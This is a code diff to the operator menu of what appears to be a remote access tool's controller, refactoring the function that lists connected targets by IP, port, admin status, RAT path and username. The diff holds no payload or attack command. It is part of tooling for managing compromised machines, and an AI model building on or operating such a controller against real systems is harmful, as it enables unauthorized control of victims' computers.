@@ -7,7 +7,6 @@
 
 
 from colorama import Fore,Style
-from prettytable import PrettyTable
 
 from .handler import Handler
 from .session import Session
@@ -15,6 +14,7 @@ from .management import Management
 from .management import CheckConn
 from .other import printColor
 from .other import XOREncryption
+from .other import printAllTarget
 from .sql import Sql
 from .broadcast import Broadcast
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT
@@ -55,19 +55,6 @@ class Menu:
         else:
             printColor("information","[-]The connection display is deactivated.\n")
     
-    
-    def printTarget(self):
-        #Print all target.
-
-        ptable = PrettyTable() #Ascii tables dynamic.
-        ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.
- 
-        for key in Handler.dict_conn.keys():
-            #print("TETS BOOL_>",type(Handler.dict_conn[key][NB_ALIVE]),":",Handler.dict_conn[key][NB_ALIVE])
-            ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])
-
-        print(Fore.GREEN,(ptable),Fore.BLUE)
-
 
     def selectTarget(self,target):    
         #Select target.
@@ -132,7 +119,7 @@ class Menu:
                         printColor("information","[-] No target found. Please enter a valid target.\n")
                         
                 elif(choice[i] == "-ls" or choice[i] == "--list"):
-                    self.printTarget()
+                    printAllTarget()
                 
                 elif(choice[i]== "--connectionDisplayDisable" or choice[i] == "-cdd"):
                     self.changeStatusDisplay(False)
